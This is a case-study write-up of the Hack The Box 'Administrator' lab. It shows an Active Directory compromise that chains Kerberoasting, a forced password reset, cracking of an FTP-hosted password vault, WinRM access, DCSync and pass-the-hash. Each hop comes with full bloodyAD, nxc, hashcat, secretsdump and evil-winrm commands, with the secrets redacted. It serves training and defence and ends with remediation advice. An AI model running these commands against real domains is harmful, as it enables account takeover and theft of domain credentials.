---
title: "Administrator — Multi-Hop Active Directory Compromise"
description: "Misconfigured object permissions drive a multi-hop chain through Kerberoasting, credential capture, and DCSync to domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberoasting
  - acl-abuse
  - dcsync
---

## Summary

Administrator is a Medium-rated Hack The Box Active Directory lab presenting a realistic internal-network compromise driven entirely by misconfigured object-level permissions. Starting from a provided domain-user credential, the recorded chain pivots through Kerberoasting, forced password reset, an FTP-hosted password vault, WinRM access, a second Kerberoasting hop, and finally DCSync to full domain compromise — without exploiting a single CVE. Credential values, hashes, target addresses, and domain identifiers are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows domain environment with a Domain Controller, plus FTP (port 21) and WinRM (port 5985) alongside standard AD services
- **Starting position:** a low-privileged domain-user credential provided by the lab
- **Objective:** Progress from the starting account to full domain compromise through the exposed delegation paths
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: standard AD services plus two extras — FTP and WinRM. The domain and Domain Controller names are identified from the scan and lab context.

Action: version/script scan of the target.

```bash
nmap -sC -sV -oA <OUT_PREFIX> <TARGET_IP>
```

Representative excerpt (truncated):

```text
AD services (LDAP, Kerberos, SMB, DNS) on domain <DOMAIN>, DC <DC_HOST>
21/tcp   open ftp  — anonymous use not claimed; authenticated access later
5985/tcp open WinRM — later foothold port
```

Technical significance: FTP and WinRM are the two non-standard surfaces. Every later pivot reuses legitimate AD or service functionality, so enumeration only needs to confirm where to authenticate, not where to exploit a CVE.

Result: the recorded output shows an AD domain with FTP and WinRM exposed.

### 2. BloodHound Collection — Mapping Delegation Paths

Observation: with a valid domain credential, BloodHound-style collection reveals who controls whom.

Action: collect domain objects and ACL edges with the starting credential.

```bash
rusthound-ce -d <DOMAIN> \
  -u '<START_USER>' -p '<START_PASSWORD>' \
  -o <OUT_DIR> -c All
```

Representative finding: the starting user holds `GenericAll` over a second user object. `GenericAll` permits writing any attribute — including `servicePrincipalName`, which controls Kerberoastability.

Result: the notes report a `GenericAll` edge from the starting account to the second account.

### 3. First Kerberoasting Hop — Forced SPN, Roasted Ticket, Cracked Password

Observation: the second account has no SPN, so it is not Kerberoastable yet. `GenericAll` fixes that.

Action: write a fake SPN onto the account, request its service ticket, crack the ticket offline.

```bash
# Make the account Kerberoastable via attribute write
bloodyAD -d <DOMAIN> --host <DC_HOST> \
  -u '<START_USER>' -p '<START_PASSWORD>' \
  set object '<SECOND_USER>' servicePrincipalName -v '<SPN_VALUE>'

# Request the service ticket hash
nxc ldap <DC_HOST> -d <DOMAIN> \
  -u '<START_USER>' -p '<START_PASSWORD>' \
  --kerberoasting <OUT_HASH_FILE>

# Crack the TGS-REP hash (mode 13100, Kerberos 5 etype 23)
hashcat -m 13100 <OUT_HASH_FILE> <WORDLIST>
# -> <SECOND_PASSWORD> (redacted, source-reported)
```

Technical significance: Kerberoasting converts a weak service-account password into an offline-crackable ticket. The attribute write is the actual privilege abuse; everything after is documented protocol behavior.

Result: the notes report the second account's password recovered (value redacted).

### 4. Lateral Movement — Forced Password Reset

Observation: the second account holds `ForceChangePassword` over a third account.

Action: reset the third account's password to an attacker-chosen value.

```bash
bloodyAD -d <DOMAIN> \
  -u '<SECOND_USER>' -p '<SECOND_PASSWORD>' \
  --host <DC_HOST> \
  set password <THIRD_USER> '<NEW_PASSWORD>'
```

Technical significance: password reset rights are equivalent to account takeover wherever the reset is not alerted on. No ticket or hash handling is needed for this hop.

Result: the notes report control of the third account (password value redacted).

### 5. Vault Recovery — FTP Password Safe Cracking

Observation: the third account authenticates to FTP, which hosts a Password Safe database (`.psafe3`).

Action: download the vault, extract its hash, crack the master password offline, open the vault.

```bash
ftp '<FTP_URL_AS_THIRD_USER>'
# get <VAULT_FILE>

pwsafe2john <VAULT_FILE> > <OUT_HASH_FILE>
john <OUT_HASH_FILE> --wordlist=<WORDLIST>
# -> <VAULT_MASTER_PASSWORD> (redacted, source-reported)
```

Representative excerpt (schema only, values redacted):

```text
vault users: <SERVICE_USER_A>, <SERVICE_USER_B>, <SERVICE_USER_C>
<3 credential pairs disclosed — values redacted>
```

Technical significance: one cracked master password exposed the internal credential inventory — a single point of failure. Storing a vault on an FTP share collapses its protection to FTP access control plus master-password strength.

Result: the notes report three service credentials recovered from the vault.

### 6. Foothold — WinRM Login

Observation: one vault credential belongs to an account with WinRM access.

Action: authenticate over WinRM.

```bash
evil-winrm -i <TARGET_HOST> \
  -u '<SERVICE_USER>' -p '<SERVICE_PASSWORD>'
```

Result: the notes report an interactive shell as the service user and the user flag (flag content omitted).

### 7. Second Kerberoasting Hop — Same Pattern, New Path

Observation: BloodHound phase 2 shows the service user holds `GenericWrite` over a further account — enough to write its SPN.

Action: same SPN-write → Kerberoast → crack sequence as stage 3, under the new identity.

```bash
bloodyAD -d <DOMAIN> \
  -u '<SERVICE_USER>' -p '<SERVICE_PASSWORD>' \
  --host <DC_HOST> \
  set object '<PRIV_USER>' servicePrincipalName -v '<SPN_VALUE>'

nxc ldap <DC_HOST> -d <DOMAIN> \
  -u '<SERVICE_USER>' -p '<SERVICE_PASSWORD>' \
  --kerberoasting <OUT_HASH_FILE>

hashcat -m 13100 <OUT_HASH_FILE> <WORDLIST>
# -> <PRIV_PASSWORD> (redacted, source-reported)
```

Result: the notes report the privileged user's password recovered.

### 8. Full Compromise — DCSync and Pass-the-Hash

Observation: the privileged user holds DCSync rights (`DS-Replication-Get-Changes-All`) — replication rights over domain credentials.

Action: replicate the domain's credential material, then authenticate as the built-in Administrator with its hash instead of its password.

```bash
impacket-secretsdump '<DOMAIN>/<PRIV_USER>:<PRIV_PASSWORD>@<DC_HOST>'
```

Representative excerpt (structure only, secrets redacted):

```text
<DOMAIN>\<ADMIN_ACCOUNT>:<RID>:<LM_HASH_REDACTED>:<NT_HASH_REDACTED>:::
```

```bash
evil-winrm -i <TARGET_HOST> \
  -u <ADMIN_ACCOUNT> \
  -H '<NT_HASH_REDACTED>'
```

Technical significance: DCSync is a protocol-legitimate replication call; against a non-DC principal it is a critical misconfiguration. Pass-the-hash then converts the replicated hash directly into an interactive session — no password cracking needed at this hop.

Result: the notes report an Administrator WinRM session and the root flag (flag content and hash values omitted).

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| Multi-hop path tracking | Drove each pivot from BloodHound ACL edges | Each hop required a different technique; object permissions dictated the order |
| Vault as single point of failure | Cracked the vault master offline, then reused its inventory | One master password guarded three service credentials |
| Final hop without a password | Used DCSync replication plus pass-the-hash | Replicated hash authenticates directly; cracking unnecessary |

## Outcome

The evidence establishes: domain-user start → Kerberoasting hop → forced-reset hop → vault credential recovery → WinRM foothold → second Kerberoasting hop → DCSync → built-in Administrator session. Cracked passwords, replicated hashes, and flag acquisitions are source-reported with values omitted. No CVE exploitation is claimed at any hop.

**Attack chain:**
AD enumeration → BloodHound ACL mapping → SPN-write Kerberoasting → forced password reset → FTP vault cracking → WinRM foothold → second Kerberoasting → DCSync → pass-the-hash Administrator

## Lessons and Recommendations

Recommendations below follow the source remediation; none were re-tested during curation.

1. **Audit AD ACLs regularly.** `GenericAll`, `GenericWrite`, and `ForceChangePassword` on user objects are routine over-provisioning. Run BloodHound-style analysis periodically and remove non-standard delegation paths, especially toward high-value targets. (Recommendation.)
2. **Restrict DCSync rights strictly.** Only Domain Controllers should hold replication rights. Any user-class object with them is a critical finding — a direct path to full domain compromise. (Recommendation.)
3. **Keep credential vaults off file shares.** Password Safe, KeePass, and similar files belong on dedicated secrets infrastructure with MFA, access logging, and break-glass procedures — never on FTP or general shares. (Recommendation.)
4. **Treat weak service passwords as domain-compromise risk.** Any Kerberoastable account with a crackable password extends the blast radius to everything its ACLs touch. (Lesson grounded in both roasting hops.)
5. **Alert on attribute writes and resets.** SPN modifications and out-of-band password resets are the two pivot primitives here; both are detectable in directory audit logs. (Lesson grounded in this chain.)

Editorial MITRE view (mapping only, not a source claim): account discovery and permission-group mapping; valid-account logon; Kerberoasting of service tickets; password-reset abuse; credential-store cracking; DCSync replication; pass-the-hash lateral movement.

## References

- Hack The Box machine **[Administrator](https://app.hackthebox.com/machines/Administrator)** (retired lab; no active-instance detail)
- BloodHound-style AD attack-path analysis documentation
- `bloodyAD`, `nxc`, `hashcat`, `evil-winrm`, and Impacket `secretsdump` tool documentation
